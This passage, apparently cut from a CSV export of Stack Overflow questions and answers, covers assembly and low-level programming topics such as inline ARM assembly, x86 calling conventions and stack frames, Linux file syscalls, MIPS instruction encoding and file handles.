","<p>gcc actually produces assembler and assembles it using the <strong>as</strong> assembler. Not all compilers do this - the MS compilers produce object code directly, though you can make them generate assembler output. Translating assembler to object code is a pretty simple process, at least compared with compilation.  </p>

<p>Some compilers produce other high-level language code as their output - for example, <strong>cfront</strong>, the first C++ compiler produced C as its output which was then compiled by a C compiler.</p>

<p>Note that neither direct compilation or assembly actually produce an executable. That is done by the <strong>linker</strong>, which takes the various object code files produced by compilation/assembly, resolves all the names they contain and produces the final executable binary.</p>
","845365"
"How do I do inline assembly on the IPhone?","12874","","<p>How is it done? What steps do I need to take and what pitfalls and gotchas are there to consider?</p>
","<p>I've gotten this to work, thanks to some inside help over at the <a href=""https://devforums.apple.com/"" rel=""noreferrer"">Apple Devforums</a>, you should sign up if you're a dedicated IPhone developer.</p>

<p>First thing's first, it's <em>__asm__()</em>, not plain <em>asm()</em>.</p>

<p>Secondly, by default, XCode generates a compilation target that compiles inline assembly against the ARM Thumb instruction set, so <em>usat</em> wasn't recognized as a proper instruction. To fix this, do ""Get Info"" on the Target. Scroll down to the section ""GCC 4.0 - Code Generation"" and uncheck ""Compile for Thumb"". Then this following snippet will compile just fine if you set the Active SDK to ""Device""</p>

<pre><code>inline int asm_saturate_to_255 (int a) {
  int y;
  __asm__(""usat %0, #8, %1\n\t"" : ""=r""(y) : ""r""(a));
  return y;
}
</code></pre>

<p>Naturally, now it won't work with the IPhone Simulator. But <em>TargetConditionals.h</em> has defines you can #ifdef against. Namely <em>TARGET_OS_IPHONE</em> and <em>TARGET_IPHONE_SIMULATOR</em>.</p>
","248718"
"What do C and Assembler actually compile to?","12848","","<p>So I found out that C(++) programs actually don't compile to plain ""binary"" (I may have gotten some things wrong here, in that case I'm sorry :D) but to a range of things (symbol table, os-related stuff,...) but...</p>

<ul>
<li><p>Does assembler ""compile"" to pure binary? That means no extra stuff besides resources like predefined strings, etc.</p></li>
<li><p>If C compiles to something else than plain binary, how can that small assembler bootloader just copy the instructions from the HDD to memory and execute them? I mean if the OS kernel, which is probably written in C, compiles to something different than plain binary - how does the bootloader handle it?</p></li>
</ul>

<p>edit: I know that assembler doesn't ""compile"" because it only has your machine's instruction set - I didn't find a good word for what assembler ""assembles"" to. If you have one, leave it here as comment and I'll change it.</p>
","<p>C typically compiles to assembler, just because that makes life easy for the poor compiler writer.</p>

<p>Assembly code always assembles (not ""compiles"") to <em>relocatable object code</em>.  You can think of this as binary machine code and binary data, but with lots of decoration and metadata.  The key parts are:</p>

<ul>
<li><p>Code and data appear in named ""sections"".</p></li>
<li><p>Relocatable object files may include definitions of <em>labels</em>, which refer to locations within the sections.</p></li>
<li><p>Relocatable object files may include ""holes"" that are to be filled with the values of labels defined elsewhere.  The official name for such a hole is a <em>relocation entry</em>.</p></li>
</ul>

<p>For example, if you compile and assemble (but don't link) this program</p>

<pre><code>int main () { printf(""Hello, world\n""); }
</code></pre>

<p>you are likely to wind up with a relocatable object file with</p>

<ul>
<li><p>A <code>text</code> section containing the machine code for <code>main</code></p></li>
<li><p>A label definition for <code>main</code> which points to the beginning of the text section</p></li>
<li><p>A <code>rodata</code> (read-only data) section containing the bytes of the string literal <code>""Hello, world\n""</code></p></li>
<li><p>A relocation entry that depends on <code>printf</code> and that points to a ""hole"" in a call instruction in the middle of a text section.</p></li>
</ul>

<p>If you are on a Unix system a relocatable object file is generally called a .o file, as in <code>hello.o</code>, and you can explore the label definitions and uses with a simple tool called <code>nm</code>, and you can get more detailed information from a somewhat more complicated tool called <code>objdump</code>.</p>

<p>I teach a class that covers these topics, and I have students write an assembler and linker, which takes a couple of weeks, but when they've done that most of them have a pretty good handle on relocatable object code.  It's not such an easy thing.</p>
","2137500"
"What is pipelining? how does it increase the speed of execution?","12838","","<p>I believe that no question is silly if it is bugging you. I have this question about pipe-lining?</p>

<p>What is <strong>pipe-lining?</strong></p>

<p>Theory says that : ""<strong>With pipelining, the CPU begins executing a second instruction before the first instruction is completed.</strong> Pipelining <strong>results in faster processing</strong> because the CPU does not have to wait for one instruction to complete the machine cycle.""</p>

<p>My question is considering i am working on a uni-processor system, where only one instruction can be executed at a time, how is it possible that simultaneous operation of fetching next instruction is performed when my CPU is busy? If i am lacking conceptual clarity please throw some light on me. If there is separate hardware which makes simultaneous processing happen, what is it? Kindly explain.</p>
","<p>There is indeed separate hardware for fetching.  There is a whole bunch of bits of separate hardware, arranged in a pipeline.  Each part is executing one part of a separate instruction simultaneously.  On every clock edge, the results of one stage get passed down to the next.</p>
","9551574"
"Using Assembly Language in C/C++","12754","","<p>I remember reading somewhere that to really optimize &amp; speed up certain section of the code, programmers write that section in Assembly language. My questions are - </p>

<ol>
<li>Is this practice still done? and How does one do this?</li>
<li>Isn't writing in Assembly Language a bit too cumbersome &amp; archaic?</li>
<li>When we compile C code (with or without -O3 flag), the compiler does some code optimization &amp; links all libraries &amp; converts the code to binary object file. So when we run the program it is already in its most basic form i.e. binary. So how does inducing 'Assembly Language' help?</li>
</ol>

<p>I am trying to understand this concept &amp; any help or links is much appreciated.</p>

<p><strong>UPDATE:</strong> Rephrasing point 3 as requested by dbemerlin- Because you might be able to write more effective assembly code than the compiler generates but unless you are an assembler expert your code will propably run slower because often the compiler optimizes the code better than most humans can.</p>
","<p>The only time it's useful to revert to assembly language is when</p>

<ul>
<li><p>the CPU instructions don't have functional equivalents in C++ (e.g. single-instruction-multiple-data instructions, BCD or decimal arithmetic operations)</p>

<ul>
<li>AND the compiler doesn't provide extra functions to wrap these operations (e.g. C++11 Standard has <a href=""http://en.cppreference.com/w/cpp/atomic"" rel=""nofollow noreferrer"">atomic operations</a> including <a href=""http://en.cppreference.com/w/cpp/atomic/atomic_exchange"" rel=""nofollow noreferrer"">compare-and-swap</a>, <code>&lt;cstdlib&gt;</code> has <a href=""http://en.cppreference.com/w/cpp/numeric/math/div"" rel=""nofollow noreferrer""><code>div</code>/<code>ldiv</code></a> et al for getting quotient <em>and</em> remainder efficiently)</li>
<li>AND there isn't a good third-party library (e.g. <a href=""http://mitpress.mit.edu/catalog/item/default.asp?tid=3952&amp;ttype=2"" rel=""nofollow noreferrer"">http://mitpress.mit.edu/catalog/item/default.asp?tid=3952&amp;ttype=2</a>)</li>
</ul>

<p><em>OR</em></p></li>
<li><p>for some inexplicable reason - the optimiser is failing to use the best CPU instructions</p></li>
</ul>

<p><em>...AND...</em></p>

<ul>
<li>the use of those CPU instructions would give some significant and useful performance boost to bottleneck code.</li>
</ul>

<p>Simply using inline assembly to do an operation that can easily be expressed in C++ - like adding two values or searching in a string - is actively counterproductive, because:</p>

<ul>
<li>the compiler knows how to do this equally well

<ul>
<li>to verify this, look at its assembly output (e.g. <code>gcc -S</code>) or disassemble the machine code</li>
</ul></li>
<li>you're artificially restricting its choices regarding register allocation, CPU instructions etc., so it may take longer to prepare the CPU registers with the values needed to execute your hardcoded instruction, then longer to get back to an optimal allocation for future instructions

<ul>
<li>compiler optimisers can choose between equivalent-performance instructions specifying different registers to minimise copying between them, and may choose registers in such a way that a single core can process multiple instructions during one cycle, whereas forcing everythingt through specific registers would serialise it

<ul>
<li>in fairness, GCC has ways to express needs for specific types of registers without constraining the CPU to an exact register, still allowing such optimisations, but it's the only inline assembly I've ever seen that addresses this</li>
</ul></li>
</ul></li>
<li>if a new CPU model comes out next year with another instruction that's 1000% faster for that same logical operation, then the compiler vendor is more likely to update their compiler to use that instruction, and hence your program to benefit once recompiled, than you are (or whomever's maintaining the software then is)</li>
<li>the compiler will select an optimal approach for the target architecture its told about: if you hardcode one solution then it will need to be a lowest-common-denominator or <code>#ifdef</code>-ed for your platforms</li>
<li>assembly language isn't as portable as C++, both across CPUs and across compilers, and even if you seemingly port an instruction, it's possible to make a mistake re registers that are safe to clobber, argument passing conventions etc.</li>
<li>other programmers may not know or be comfortable with assembly</li>
</ul>

<p>One perspective that I think's worth keeping in mind is that when C was introduced it had to win over a lot of hardcore assembly language programmers who fussed over the machine code generated.  Machines had less CPU power and RAM back then and you can bet people fussed over the tiniest thing.  Optimisers became very sophisticated and have continued to improve, whereas the assembly languages of processors like the x86 have become increasingly complicated, as have their execution pipelines, caches and other factors involved in their performance.  You can't just add values from a table of cycles-per-instruction any more.  Compiler writers spend time considering all those subtle factors (especially those working for CPU manufacturers, but that ups the pressure on other compilers too).  It's now impractical for assembly programmers to average - over any non-trivial application - significantly better efficiency of code than that generated by a good optimising compiler, and they're overwhelmingly likely to do worse.  So, use of assembly should be limited to times it really makes a measurable and useful difference, worth the coupling and maintenance costs.</p>
","4203005"
"c++ passing arguments by reference and pointer","12727","","<p>in c++  </p>

<pre><code>class bar
{
    int i;
    char b;
    float d;
};

void foo ( bar arg );
void foo ( bar &amp;arg );
void foo ( bar *arg );
</code></pre>

<p>this is a sample class/struct and functions<br>
i have some Qs  </p>

<ul>
<li>what's the difference between 1st and 2nd way of passing the argument in 'asm', size, speed ?  </li>
<li>how the arguments are passed to the functions foo in each case ( in case of pointer i know the pointer is pushed on the stack )  </li>
<li>when passing arguments, in terms of efficiency at ( speed, size, preferability ) which is better ?  </li>
<li>what's the intel 'asm' syntax that corresponds each of the ways of passing arguments ?  </li>
</ul>

<p>i know what most say about ""it doesn't matter on modern compilers and CPUs"" but what if we're talking about Old CPUs or compilers?  </p>

<p>thanks in advance</p>
","<p>The pointer and the reference methods should be quite comparable (both in speed, memory usage and generated code).</p>

<p>Passing a class directly forces the compiler to duplicate memory and put a copy of the <code>bar</code> object on the stack. What's worse, in C++ there are all sort of nasty bits (the default copy constructor and whatnot) associated with this.</p>

<p>In C I always use (possibly const) pointers. In C++ you should likely use references.</p>
","6732743"
"How does the `test` instruction work?","12709","","<p>If we have:</p>

<pre><code>test dword ptr [eax], 2000h
je label1:
</code></pre>

<p>Is there any value other than <code>0</code> in <code>dword ptr [eax]</code> that would make the jump take place?</p>
","<p>Instruction <strong>test</strong> works like <strong>and</strong> instruction, the only difference is that result is not stored back in to the destination operand.
So the answer is yes. All binary numbers which not have set the 13th bit on memory address [eax], or all numbers present like b'xxxxxxxx xxxxxxxx xx0xxxxx xxxxxxxx', where x is 0 or 1, there is exactly 2^31 numbers.</p>
","4458496"
"Text Editor For Assembly","12703","","<p>I'm now developing on Assembly under Linux, but I love to develop on a editor that have syntax highlight feature. Then I want to know what is the best one for Assembly(that has syntax highlight).</p>
","<p><a href=""http://www.vim.org"" rel=""nofollow noreferrer"" title=""Vim"">Vim</a> is my preferred editor. It supports syntax highlighting of assembly code, and if you don't like the default, you can always change it.</p>

<p>See also <a href=""https://stackoverflow.com/questions/782384/assembly-vim-syntax-highlighting"" title=""SO question on vim assembly syntax highlighting"">this SO question</a> for more on the Vim assembly syntax highlighting.</p>
","2158466"
"Why does gcc push %rbx at the beginning of main?","12699","","<p>The latest version of gcc is producing assembly that doesn't make sense to me.  I compiled the code using no optimization; but, some parts of this code don't make sense, even with no optimization.</p>

<p>Here is the C source:</p>

<pre><code>  #include &lt;stdio.h&gt;

   int main()
   {
     int a = 1324;
     int b = 5657;
     int difference = 9876;
     int printf_answer = 2221;

     difference = a - b;

     printf_answer = printf(""%d + %d = %d\n"", a, b, difference);

     return difference;
   }
</code></pre>

<p>It produces this assembly:</p>

<pre><code>    .file   ""exampleIML-1b.c""
    .section    .rodata
.LC0:
    .string ""%d + %d = %d\n""
    .text
.globl main
    .type   main, @function
main:
.LFB0:
    .cfi_startproc
    pushq   %rbp
    .cfi_def_cfa_offset 16
    .cfi_offset 6, -16
    movq    %rsp, %rbp
    .cfi_def_cfa_register 6
    pushq   %rbx
    subq    $24, %rsp
    movl    $1324, -32(%rbp)
    movl    $5657, -28(%rbp)
    movl    $9876, -24(%rbp)
    movl    $2221, -20(%rbp)
    movl    -28(%rbp), %eax
    movl    -32(%rbp), %edx
    movl    %edx, %ecx
    subl    %eax, %ecx
    movl    %ecx, %eax
    movl    %eax, -24(%rbp)
    movl    $.LC0, %eax
    movl    -24(%rbp), %ecx
    movl    -28(%rbp), %edx
    movl    -32(%rbp), %ebx
    .cfi_offset 3, -24
    movl    %ebx, %esi
    movq    %rax, %rdi
    movl    $0, %eax
    call    printf
    movl    %eax, -20(%rbp)
    movl    -24(%rbp), %eax
    addq    $24, %rsp
    popq    %rbx
    leave
    .cfi_def_cfa 7, 8
    ret
    .cfi_endproc
.LFE0:
    .size   main, .-main
    .ident  ""GCC: (GNU) 4.4.6 20120305 (Red Hat 4.4.6-4)""
    .section    .note.GNU-stack,"""",@progbits
</code></pre>

<p>Several things don't make sense:</p>

<p>(1) Why are we pushing %rbx?  What is in %rbx that needs to be saved?</p>

<p>(2) Why are we moving %edx to %ecx before subtracting?  What doesn't it just do <code>sub %eax, %edx</code>?</p>

<p>(3) Similarly, why the move from %ecx back to %eax before storing the value?</p>

<p>(4) The compiler is putting the variable a in memory location -32(%rbp).  Unless I'm adding wrong, isn't -32(%rbp) equal to the stack pointer?  Shouldn't all local variables be stored at values <em>less than</em> the current stack pointer?</p>

<p>I'm using this version of gcc:</p>

<p>[eos17:~/Courses/CS451/IntelMachineLanguage]$ gcc -v
Using built-in specs.
Target: x86_64-redhat-linux
Configured with: ../configure --prefix=/usr --mandir=/usr/share/man --infodir=/usr/share/info --with-bugurl=http://bugzilla.redhat.com/bugzilla --enable-bootstrap --enable-shared --enable-threads=posix --enable-checking=release --with-system-zlib --enable-__cxa_atexit --disable-libunwind-exceptions --enable-gnu-unique-object --enable-languages=c,c++,objc,obj-c++,java,fortran,ada --enable-java-awt=gtk --disable-dssi --with-java-home=/usr/lib/jvm/java-1.5.0-gcj-1.5.0.0/jre --enable-libgcj-multifile --enable-java-maintainer-mode --with-ecj-jar=/usr/share/java/eclipse-ecj.jar --disable-libjava-multilib --with-ppl --with-cloog --with-tune=generic --with-arch_32=i686 --build=x86_64-redhat-linux
Thread model: posix
gcc version 4.4.6 20120305 (Red Hat 4.4.6-4) (GCC) </p>
","<pre><code>GCC dictates how the stack is used. Contract between caller and callee on x86:

    * after call instruction:
          o %eip points at first instruction of function
          o %esp+4 points at first argument
          o %esp points at return address 
    * after ret instruction:
          o %eip contains return address
          o %esp points at arguments pushed by caller
          o called function may have trashed arguments
          o %eax contains return value (or trash if function is void)
          o %ecx, %edx may be trashed
          o %ebp, %ebx, %esi, %edi must contain contents from time of call 
    * Terminology:
          o %eax, %ecx, %edx are ""caller save"" registers
          o %ebp, %ebx, %esi, %edi are ""callee save"" registers
</code></pre>

<p>The main function is like any other function in this context. gcc decided to use <code>ebx</code> for intermediate calculations, so it preserves its value.</p>
","12736638"
"Code injecting/assembly inlining in Java?","12686","","<p>I know Java is a secure language but when matrix calculations are needed, can I try something faster?</p>

<p>I am learning __asm{} in C++, Digital-Mars compiler and FASM. I want to do the same in Java. How can I inline assembly codes in functions? Is this even possible?</p>

<p>Something like this (a vectorized loop to clamp all elements of an array to a value without branching, using AVX support of CPU):</p>

<pre><code>JavaAsmBlock(
   # get pointers into registers somehow
   # and tell Java which registers the asm clobbers somehow
     vbroadcastss  twenty_five(%rip), %ymm0
     xor   %edx,%edx
.Lloop:                            # do {
    vmovups   (%rsi, %rdx, 4), %ymm1
    vcmpltps   %ymm1, %ymm0, %ymm2
    vblendvps  %ymm2, %ymm0, %ymm1, %ymm1
    vmovups    %ymm1, (%rdi, %rdx, 4)
    # TODO: unroll the loop a bit, and maybe use aligned loads/stores in the main loop
    add         $32, %rdx
    cmp         %rcx, %rdx
    jb     .Lloop                  # } while(idx &lt; count)
);

System.out.println(var[0]);
</code></pre>

<p>I don't want to use a code-injector. I want to see the Intel or AT&amp;T style x86 instructions.</p>
","<p>There is a layer of abstraction between your Java code and the underlying hardware that makes this kind of thing impossible in principle; you technically can't know how your code is represented on the underlying machine, since the same bytecode can run on different processors and different architectures.</p>

<p>What you officially <em>can</em> do is use the <a href=""http://docs.oracle.com/javase/1.5.0/docs/guide/jni/spec/jniTOC.html"" rel=""noreferrer"">Java Native Interface</a> (JNI) to call native code from your Java code. The call overhead is substantial, and sharing data with Java is fairly expensive, so this should be used only for decent-sized chunks of native code.</p>

<p>In theory, such an extension should be possible, though. One can imagine a Java compiler that targeted a specific platform and allowed assembly escapes. The compiler would have to publish its ABI, so you'd know the calling conventions. I'm not aware of any that do, however. But there are <a href=""http://www.excelsior-usa.com/jet.html"" rel=""noreferrer"">several</a> <a href=""http://gcc.gnu.org/java/"" rel=""noreferrer"">compilers</a> <a href=""http://jnc.mtsystems.ch/"" rel=""noreferrer"">available</a> that compile Java directly to native code; it's possible one of them supports something like this without my knowing, or could be extended to do so.</p>

<p>Finally, on a different level altogether, there are bytecode assemblers for the JVM, like <a href=""http://jasmin.sourceforge.net/"" rel=""noreferrer"">Jasmin.</a> A bytecode assembler lets you write ""machine code"" that targets the JVM directly, and sometimes you can write better code than the <code>javac</code> compiler can generate. It's fun to play with, in any event.</p>
","11632170"
"What happens in assembly language when you call a method/function?","12684","","<p>If I have a program in C++/C that (language doesn't matter much, just needed to illustrate a concept):</p>

<pre><code>#include &lt;iostream&gt;    

void foo() {
    printf(""in foo"");
}

int main() {
    foo();
    return 0;
}
</code></pre>

<p>What happens in the assembly? I'm not actually looking for assembly code as I haven't gotten that far in it yet, but what's the basic principle? </p>
","<p>In general, this is what happens:</p>

<ol>
<li>Arguments to the function are stored on the stack. In platform specific order.</li>
<li>Location for return value is ""allocated"" on the stack</li>
<li>The return address for the function is also stored in the stack or in a special purpose CPU register.</li>
<li>The function (or actually, the address of the function) is called, either through a CPU specific <code>call</code> instruction or through a normal <code>jmp</code> or <code>br</code> instruction (jump/branch)</li>
<li>The function reads the arguments (if any) from the stack and the runs the function code</li>
<li>Return value from function is stored in the specified location (stack or special purpose CPU register)</li>
<li>Execution jumps back to the caller and the stack is cleared (by restoring the stack pointer to its initial value).</li>
</ol>

<p>The details of the above vary from platform to platform and even from compiler to compiler (see e.g. STDCALL vs CDECL calling conventions). For instance, in some cases, CPU registers are used instead of storing stuff on the stack. The general idea is the same though</p>
","1585164"
"How to open a file in assembler and modify it?","12663","","<p>I'm starting to learn Assembler and I'm working in Unix. I want to open a file and write   'Hello world' on it.</p>

<pre><code>section.data

textoutput db 'Hello world!', 10
lentext equ $ - textoutput
filetoopen db 'hi.txt'

section .text
global _start

_start:

mov eax, 5            ;open
mov ebx, filetoopen
mov ecx, 2            ;read and write mode
int 80h

mov eax, 4
mov ebx, filetoopen   ;I'm not sure what do i have to put here, what is the ""file descriptor""?
mov ecx, textoutput
mov edx, lentext

mov eax, 1
mov ebx, 0
int 80h              ; finish without errors
</code></pre>

<p>But when I compile it, it doesn't do anything. What am I doing wrong?
When I open a file where does the file descriptor value return to?</p>
","<p>This is x86 Linux (x86 is not the only assembly language, and Linux is not the only Unix!)...</p>

<pre><code>section .data

textoutput db 'Hello world!', 10
lentext equ $ - textoutput
filetoopen db 'hi.txt'
</code></pre>

<p>The filename string requires a 0-byte terminator: <code>filetoopen db 'hi.txt', 0</code></p>

<pre><code>section .text
global _start

_start:

mov eax, 5            ;open
mov ebx, filetoopen
mov ecx, 2            ;read and write mode
</code></pre>

<p><code>2</code> is the <code>O_RDWR</code> flag for the <code>open</code> syscall.  If you want the file to be created if it doesn't already exist, you will need the <code>O_CREAT</code> flag as well; and if you specify <code>O_CREAT</code>, you need a third argument which is the permissions mode for the file.  If you poke around in the C headers, you'll find that <code>O_CREAT</code> is defined as <code>0100</code> - beware of the leading zero: this is an octal constant!  You can write octal constants in <code>nasm</code> using the <code>o</code> suffix.</p>

<p>So you need something like <code>mov ecx, 0102o</code> to get the right flags and <code>mov edx, 0666o</code> to set the permssions.</p>

<pre><code>int 80h
</code></pre>

<p>The return code from a syscall is passed in <code>eax</code>.  Here, this will be the file descriptor (if the open succeeded) or a small negative number, which is a negative <code>errno</code> code (e.g. -1 for <code>EPERM</code>).  Note that the convention for returning error codes from a raw syscall is <em>not</em> quite the same as the C syscall wrappers (which generally return <code>-1</code> and set <code>errno</code> in the case of an error)...</p>

<pre><code>mov eax, 4
mov ebx, filetoopen   ;I'm not sure what do i have to put here, what is the ""file descriptor""?
</code></pre>

<p>...so here you need to <code>mov ebx, eax</code> first (to save the <code>open</code> result before <code>eax</code> is overwritten) then <code>mov eax, 4</code>.  (You might want to think about checking that the result was positive first, and handling the failure to open in some way if it isn't.)</p>

<pre><code>mov ecx, textoutput
mov edx, lentext
</code></pre>

<p>Missing <code>int 80h</code> here.</p>

<pre><code>mov eax, 1
mov ebx, 0
int 80h              ; finish without errors
</code></pre>
","8313863"
"Windows IDE for Intel x86 Assembler?","12639","","<p>Are there any IDEs (similar to Visual Studio) in which one can code and run Intel assembly? I believe I came across an Intel suite previously, but the product was quite expensive.</p>

<p>At university we used a development IDE/Simulator for ARM, but was hoping for one for Intel x86.</p>
","<p><a href=""http://en.wikipedia.org/wiki/Microsoft_Macro_Assembler"" rel=""noreferrer"">MASM</a> is an x86 assembler for Windows that uses the Intel syntax. (<a href=""http://www.masm32.com/"" rel=""noreferrer"">MASM Homepage</a>)</p>

<p>For an IDE, you could use MASM with Visual Studio, as described <a href=""http://kipirvine.com/asm/gettingStartedVS2010/index.htm"" rel=""noreferrer"">here</a>, or you could use something smaller like <a href=""http://www.oby.ro/rad_asm/"" rel=""noreferrer"">RadASM</a>. <a href=""http://www.winasm.net/"" rel=""noreferrer"">WinASM</a> is also another one.</p>

<p>When I do any ASM on my Linux box I use NASM plus a text editor (gedit).</p>
","7897400"
"What does ""short"" jump mean in assembly language?","12629","","<p>What does the ""SHORT"" mean in this code?</p>

<pre><code>JE SHORT 00013FB8
</code></pre>
","<p>Short jumps (and near calls) are jumps whos target is in the same module(they are intramodular, however it is possible to get intermodular variants from certain hacks), they are most commonly up to 127 bytes of relative displacement(they change the flow of execution forward or backward from the address of the instruction), however there are 16bit variants offering 32k bytes. You don't really need to worry about it much, its really superfluos information, but the intel developer manuals(volumes 2a and 2b, specifically 2a) will cover the gory details</p>
","5758059"
"Process of Converting a MIPS Instruction to its Hex code","12614","","<p>I'm trying to find an explanation online, but everything I find seems to be a conversion program someone wrote that doesn't really explain it. Looked for questions here on SO and most of it is above my pay grade, I'm looking at the very beginning of the basics. I understand the idea (I think):</p>

<pre><code>`add $s0, $s3, $s5`
</code></pre>

<p>Isolate them like so
<img src=""https://i.stack.imgur.com/xwZPA.png"" alt=""Green sheet snippet""></p>

<p>And keeping in mind ""rd"" needs to come from the first register, $s0, convert the pieces to hex based on the <a href=""http://www-inst.eecs.berkeley.edu/~cs61c/resources/MIPS_Green_Sheet.pdf"" rel=""nofollow noreferrer"">MIPS Green Sheet</a>, giving us</p>

<pre><code>add = op code of 0  
$s3 = 19 in decimal, 13 in hex  
$s5 = 21 in decimal, 15 in hex  
$s0 = 16 in decimal, 10 in hex  
shamt = 0  
funct = 20 from add
</code></pre>

<p>This already has me lost, since it would be 0131510020... Not 8 bits. Nope.</p>

<p>And based on this <a href=""http://www.kurtm.net/mipsasm/index.cgi"" rel=""nofollow noreferrer"">online converter</a>, it comes out as</p>

<pre><code>`02758020` in hex
</code></pre>

<p>How in the world does that happen? I'm even playing with the converter, just moving up one register at a time and the changes are just confusing me further. Is there a trick to this I missed or a good resource? Every video I find is talking about machine code (binary) and never goes into the hex portion of it.</p>
","<p>You need to put it together in binary, not in hex.</p>

<p>The little numbers in the image tell you the amount of bits of every part.</p>

<pre><code>add = op code of 0, 000000 in bin
$s3 = 19 in decimal, 13 in hex, 10011 in bin
$s5 = 21 in decimal, 15 in hex, 10101 in bin
$s0 = 16 in decimal, 10 in hex, 10000 in bin
shamt = 0, 00000 in bin
funct = 20 from add, 10100 in bin
</code></pre>

<p>Then put everything together and convert to hexadecimal:</p>

<p>0b00000010011101011000000000100000 = 0x02758020</p>
","28491348"
"Base pointer and stack pointer","12587","","<p>Given this piece of code:</p>

<pre><code>       swap:

            push ebp ; back up the base pointer,
            mov ebp, esp
            ; push the context of the registers on the stack

            push eax
            push ebx
            push ecx
            push edx

            mov eax, [ebp+8] ; address of the first parameter
            mov ebx, [ebp+12] ; address of the second parameter
            mov dl, [eax]
            mov cl, [ebx]

            mov [eax], cl

            mov [ebx], dl

            ; restore the context of the registers from the stack

            pop edx
            pop ecx  
            pop ebx
            pop eax
            ; restore the ebp
            pop ebp
            ret
</code></pre>

<p>(This is just the method. Previously we pushed the first and the second parameter on the stack.)</p>

<p>My question is: why do we add 8 to the Base Pointer to get to the address of the first parameter and then 12 ? </p>

<p>I get the fact that they are dword so each of them are 4 bytes..so from ebp + 8 to ebp + 12 it makes sens to make. But why the first one is ebp + 8 ? Because if ESP points to the TOP of the stack, mov ebp, esp means that EBP points to the TOP of the stack. Then we push 4 values on the stack : eax, ebx, ecx and edx. Why is EBP + 8 pointing on the first parameter ? </p>
","<p>When the function is called, the stack looks like:</p>

<pre><code>+-------------+
| Parameter 2 |
+-------------+
| Parameter 1 |
+-------------+
| Return Addr |  &lt;-- esp
+-------------+    
</code></pre>

<p>then after the ""stack frame"" is set up:</p>

<pre><code>+-------------+
| Parameter 2 | &lt;-- [ebp + 12]
+-------------+
| Parameter 1 | &lt;-- [ebp + 8]
+-------------+
| Return Addr |  
+-------------+    
| saved ebp   | &lt;-- ebp
+-------------+ &lt;-- esp
</code></pre>

<p>Now the context is saved:</p>

<pre><code>+-------------+
| Parameter 2 | &lt;-- [ebp + 12]
+-------------+
| Parameter 1 | &lt;-- [ebp + 8]
+-------------+
| Return Addr |  
+-------------+    
| saved ebp   | &lt;-- ebp
+-------------+ 
| saved eax   |  
+-------------+    
| saved ebx   |  
+-------------+    
| saved ecx   |  
+-------------+    
| saved edx   | &lt;-- esp
+-------------+    
</code></pre>

<p>Don't forget that on many systems the stack grows downward (and that is definitely true of the x86 family), so the top of the stack will have the lowest memory address.</p>
","10264548"
"How to calculate a negative number in assembly","12587","","<p>I'm a newbie in assembly and I have a question about how to represent negative numbers
I have three DWORDS variable, let say: </p>

<pre><code>result DWORD 0
i DWORD 3
j DWORD 5
</code></pre>

<p>and I want to calculate this formula: result = i - j + 8
but, when i do the i-j, the result will be a very high number because of the sign
so how do I make the result ok in the end?</p>
","<p>For 32 bit DWORD the integer range is from –2147483648 to 2147483647 or in hex -0x80000000 to 0x7FFFFFFF.</p>

<p>So the number -1 is present like 0xFFFFFFFF. (Like counter underflow)</p>

<p>If the high (31) bit is set then the number is negative. To make positive number from negative (negation) you must make compement of number and add 1.</p>

<p><strong>Example:</strong></p>

<pre><code>    0xFFFFFFFE   //-2
xor 0xFFFFFFFF   //binary complement 
---------------
    0x00000001   //result of complement
+   0x00000001   //add 1
---------------
    0x00000002   //Result of negation is 2
</code></pre>
","4260416"
"Near and Far JMPs","12543","","<p>I am doing Linux assembly and I understand that is has a flat memory model. What I am confused about is NEAR and FAR JMPs. </p>

<p>NEAR is in the same segment while FAR is another segment. From what I understand there are no segments in linux virtual memory? Also how do we know if my program's code is laid out in multiple segments? </p>
","<p>It hasn't been segments for a long time now. The correct term in protected mode x86 is <em>selector.</em></p>

<p>Having said that, the difference between a near jump and a far one is that the former maintains the same code selector <code>cs</code> while the latter (usually) changes it.</p>

<p>In a flat memory model, the former case is almost always how it's done.</p>

<p>You <em>could</em> have an operating system where the flat memory model is served by multiple selectors but I can't see a useful use case for it, and it's not the way Linux works, at least on x86.</p>
","14812301"
"How do they convert Decimal to Hexadecimal so fast (in mind)?","12539","","<p>I've observed few reverse engineers, they convert decimal to hexadecimal so fast in mind. It's simply amazing. I never got chance to ask them. Personally, I really suck it this conversion and I always use a calculator for conversion.</p>

<p>I was wondering if there is some kind of short cut for this conversion?</p>

<p>I think especially for a reverse engineer &amp; a low level (Assembly, Embedded) programmer. Its a BIG PLUS if he can count, add, subtract and think in terms of HEX instead of decimal. If you have any tips for this, kindly share.</p>
","<p>You need to know the basic conversions 0-16, 0x0-0xF and 0b0-0b1111 conversions by hart.</p>

<p>The rest you learn with repetition. The are some often repeated patterns to watch for.</p>

<p>Multiples:</p>

<ul>
<li>1024(1K) is 0x400</li>
<li>(1024*1024)1048567(1M) is 0x100000</li>
<li>just multiply with 4 to get the size
of 4M as 0x400000.</li>
</ul>

<p>Similar for bit positions you can learn the decimal values</p>

<ul>
<li>The MSB of a 16 bit word is 0x8000 or 32768 or 32K</li>
<li>Thus next bit has a value is 0x4000 or 16384 or 16K</li>
</ul>

<p>These patterns repeat everywhere and with time you will start to learn them.</p>

<p>If you have a binary representation it is easy to group the bits in groups of four and quickly convert to a binary representation.</p>

<p>The only realistic way to find the decimal value 0xA1B587DE is to use a calculator(or be unbelievably good at maths). But the nearest 1k boundary down from 0xA1B587DE is 0xA1B58400 which is easy if you know the patterns.</p>

<p>From your comments on opcode:<br>
For RISC processors most instructions just the first few bits in an instruction word defines the family of instruction (mov, jump, and, or, ...) and the rest is just parameters. If you work with a processor enough you will start to learn them.</p>
","4304190"
"what is a file handle and where it is useful for a programmer?","12516","","<p>I am learning assembly language along with C. this new chapter I started talks about 'file handles', file handles for screen display and file handles for keyboard input etc. I don't know what is a file handle? I am referring to IBM PC ASSEMBLY LANGUAGE PROGRAMMING by Peter Abel</p>
","<p>There is a generic concept generally called a ""handle"" in the context of computer software APIs.  In the comments you have probably found a link to the <a href=""http://en.wikipedia.org/wiki/Handle_%28computing%29"" rel=""nofollow noreferrer"">Wikipedia article on that subject</a>.</p>

<p>You are dealing with a specific implementation of a handle data type -- the IBM PC/DOS file handles returned from the <code>int 0x21</code> interface.  If you would like to learn more about these specific file handles, you might want to consult the book <a href=""https://rads.stackoverflow.com/amzn/click/020163287X"" rel=""nofollow noreferrer"">Undocumented DOS</a>, which details the in-memory data structures which allow you to investigate these handles further.</p>

